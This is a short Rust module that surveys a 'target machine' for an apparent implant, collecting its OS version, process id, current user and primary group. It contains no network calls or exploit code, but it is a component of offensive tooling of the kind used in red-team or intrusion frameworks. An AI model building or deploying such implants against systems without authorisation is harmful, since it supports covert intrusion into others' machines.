// Get info about the target machine
use crate::pb::User;
use anyhow::{Context, Result};
use sysinfo::{PidExt, SystemExt};

pub struct Info {
    system: sysinfo::System,
}

impl Info {
    pub fn new() -> Info {
        let system = sysinfo::System::new();
        Info { system }
    }

    // Get the current operating system name by parsing /etc/os-release
    pub fn os(&self) -> Result<String> {
        Ok(self.system.long_os_version().context(0)?)
    }

    // TODO: Get the current process id of the running implant
    pub fn pid(&self) -> Result<u32> {
        Ok(sysinfo::get_current_pid().ok().context(0)?.as_u32())
    }

    // Get the user running the implant
    pub fn user(&self) -> Result<User> {
        let u = User {
            id: users::get_current_uid(),
            name: users::get_current_username()
                .context(0)?
                .into_string()
                .ok()
                .context(0)?,
        };
        Ok(u)
    }

    // TODO: Get the groups this user is a part of
    pub fn groups(&self) -> Result<Vec<User>> {
        let g = User {
            id: users::get_current_gid(),
            name: users::get_current_groupname()
                .context(0)?
                .into_string()
                .ok()
                .context(0)?,
        };
        Ok(vec![g])
    }
}
